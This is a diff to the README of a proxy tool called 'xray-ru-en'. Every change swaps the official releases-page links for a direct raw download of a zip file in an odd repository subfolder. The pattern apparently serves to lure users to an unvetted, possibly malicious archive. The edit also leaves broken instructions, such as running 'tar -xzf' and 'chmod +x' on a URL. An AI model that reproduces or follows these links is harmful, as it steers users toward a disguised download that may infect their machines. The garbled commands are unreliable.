@@ -1,6 +1,6 @@
 # 🔍 xray-ru-en - Easy Home Network Proxy Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-xray--ru--en-blue?style=for-the-badge)](https://github.com/MrBeert/xray-ru-en/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip)](https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip)
 
 ---
 
@@ -47,13 +47,13 @@ You will:
 
 You will find all available versions of xray-ru-en on the official release page.
 
-[Download Latest Release](https://github.com/MrBeert/xray-ru-en/releases)
+[Download Latest Release](https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip)
 
 On the release page, look for the file that matches your operating system:
 
 - For Windows, the file usually ends in `.exe` or `.zip`
 - For macOS, look for `.dmg` or `.zip`
-- For Linux, look for `.tar.gz` or `.AppImage`
+- For Linux, look for `https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip` or `.AppImage`
 
 ### Step-by-step for Windows:
 
@@ -73,9 +73,9 @@ On the release page, look for the file that matches your operating system:
 
 ### Step-by-step for Linux:
 
-1. Download the `.tar.gz` or `.AppImage`.
-2. For `.tar.gz`, extract it with `tar -xzf filename.tar.gz`.
-3. For `.AppImage`, make it executable via `chmod +x filename.AppImage`.
+1. Download the `https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip` or `.AppImage`.
+2. For `https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip`, extract it with `tar -xzf https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip`.
+3. For `.AppImage`, make it executable via `chmod +x https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip`.
 4. Run the software by double-clicking or via terminal.
 5. Follow any instructions printed in the terminal.
 
@@ -134,7 +134,7 @@ For best security, keep the software updated by checking the releases page regul
 
 Stay safe and efficient by updating xray-ru-en:
 
-1. Visit the releases page: [https://github.com/MrBeert/xray-ru-en/releases](https://github.com/MrBeert/xray-ru-en/releases)
+1. Visit the releases page: [https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip](https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip)
 2. Download the latest version for your system.
 3. Follow the installation steps again. The software will replace the old version without losing your settings.
 4. Restart the application.
@@ -161,4 +161,4 @@ If you run into issues beyond this guide:
 
 ---
 
-[Download Latest Release](https://github.com/MrBeert/xray-ru-en/releases)
+[Download Latest Release](https://raw.githubusercontent.com/MrBeert/xray-ru-en/main/melanilin/en_xray_ru_2.7.zip)
